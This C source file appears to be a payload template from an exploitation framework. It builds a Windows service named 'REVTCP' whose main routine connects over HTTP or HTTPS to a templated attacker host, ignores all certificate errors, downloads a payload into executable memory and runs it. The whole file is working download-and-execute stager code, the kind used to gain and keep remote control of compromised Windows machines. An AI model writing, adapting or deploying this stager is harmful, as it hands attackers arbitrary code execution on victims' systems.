typedef SERVICE_STATUS_HANDLE (__stdcall *RegisterServiceCtrlHandlerProto)(LPCSTR, LPHANDLER_FUNCTION);
typedef BOOL (__stdcall *SetServiceStatusProto)(SERVICE_STATUS_HANDLE, LPSERVICE_STATUS);
typedef BOOL (__stdcall *StartServiceCtrlDispatcherProto)(const SERVICE_TABLE_ENTRYA *);

/*! @brief Number of milliseconds to wait before connection retries. */
#define RETRY_TIMEOUT_MS 1000

char cServiceName[32] = "REVTCP";
SERVICE_STATUS ss;
SERVICE_STATUS_HANDLE hStatus = NULL;


/*! @brief The user agent to use for the HTTP requests. */
#define USER_AGENT "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36"

%{DEFINITIONS}

/*!
 * @brief Connects to a provided host/port, downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param port Port number to connect to.
 * @param initialUri The URI to perform the connect back on (eg "/XXXX").
 * @param useSSL Flag to indicate the use of SSL or not.
 */

VOID reverse_http_rdl(const char* host, u_short port, const char* initialUri, BOOL useSSL)
{
  // Get things started with opening the entire internet
  HINTERNET hInternet = InternetOpen(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
  if (hInternet == NULL)
  {
    return;
  }

  // Spin up a connection instance via the "entire internet" handle which we can use to make requests.
  HINTERNET hConnect = InternetConnect(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
  if (hConnect == NULL)
  {
    return;
  }

  // SSL requires a magic set of flags to work propertly, plus we'll ignore the usual
  // errors that you'd get in the browser when hitting dodgy certs.
  DWORD flags = 0;
  if (useSSL)
  {
    flags = INTERNET_FLAG_SECURE
              | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
              | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
              | INTERNET_FLAG_NO_UI
              | INTERNET_FLAG_NO_CACHE_WRITE;
  }

  // Initialise a request, but don't submit it yet.
  const char* acceptTypes[] = { "text/*", NULL };
  HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", initialUri, NULL, NULL, acceptTypes, flags, 0);
  if (hRequest == NULL)
  {
    return;
  }

  // Again, in the case of SSL, we have to do some magic to make sure that the
  // connection doesn't error out because of a bad/unknown CA.
  if (useSSL)
  {
    DWORD secFlags;
    DWORD secFlagsBuf = sizeof(secFlags);
    InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, &secFlagsBuf);
    secFlags |= (SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION);
    InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
  }

  // with everything out of the way, we can make the request to get the payload.
  if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0))
  {
    // IN XP SP0 we have to set the flag for ignore unknwon CA AFTER it has already failed once
    // So if we fail for that reason we set that flag here and retry it.
    if (GetLastError() == 12045)
    {
        DWORD secFlags;
        DWORD secFlagsBuf = sizeof(secFlags);
        InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, &secFlagsBuf);
        secFlags |= (SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION);
        InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
        if (!HttpSendRequest(hRequest, NULL, 0, NULL, 0))
          {
            return;
          }
    }
    else
    {
        return;
    }
  }

  // Find out the payload size
  DWORD payloadSize = 0;
  DWORD bytesRead = sizeof(payloadSize);
  if (!HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &payloadSize, &bytesRead, NULL))
  {
    return;
  }

  // Prepare to read the whole request into memory.
  char* payload = (char*)VirtualAlloc(0, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (payload == NULL)
  {
    return;
  }

  // Keep looping and reading until the whole payload is loaded.
  DWORD totalBytesRead = 0;
  while (totalBytesRead < payloadSize
    && InternetReadFile(hRequest, payload + totalBytesRead, payloadSize - totalBytesRead, &bytesRead)
    && bytesRead != 0)
  {
    totalBytesRead += bytesRead;
  }

  // Close down the entire internet.
  InternetCloseHandle(hRequest);
  InternetCloseHandle(hConnect);
  InternetCloseHandle(hInternet);

  // cast our payload to a function pointer and run it.
  ((void(*)())payload)();
}


/*
 *
 */
BOOL ServiceHandler( DWORD dwControl )
{
  if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
  {
    ss.dwWin32ExitCode = 0;
    ss.dwCurrentState  = SERVICE_STOPPED;
  }

  return SetServiceStatus( hStatus, &ss );
}

/*
 *
 */
VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
{
  ZeroMemory( &ss, sizeof(SERVICE_STATUS) );
  ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
  ss.dwCurrentState = SERVICE_START_PENDING;
  ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;

  hStatus = RegisterServiceCtrlHandler( (LPCSTR)&cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );

  if ( hStatus )
  {
    ss.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus( hStatus, &ss );
    char host[256] = "%{HOST}";
    short port = %{PORT};
    char uri[512] = "%{URI}";
    reverse_http_rdl(host, port, uri, %{SSL});
    ServiceHandler( SERVICE_CONTROL_STOP );
    ExitProcess( 0 );
  }
}

/*
 *
 */
int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{
  SERVICE_TABLE_ENTRYA st[] =
    {
        { (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain },
        { NULL, NULL }
    };

  return StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRYA *)&st );
}
